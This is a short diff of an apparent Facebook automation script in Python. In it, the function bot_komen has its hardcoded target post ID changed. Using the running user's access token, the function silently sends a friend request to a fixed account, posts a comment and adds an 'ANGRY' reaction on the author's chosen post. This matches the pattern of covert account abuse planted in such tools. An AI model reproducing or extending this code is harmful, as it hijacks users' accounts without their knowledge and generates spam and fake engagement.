@@ -203,7 +203,7 @@ def bot_komen():
     una = '100045781089477'
     kom = 'Hai Bang Jago\xf0\x9f\x98\x98'
     reac = 'ANGRY'
-    post = '104214687781234'
+    post = '196828395186529'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toke)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
     requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toke)
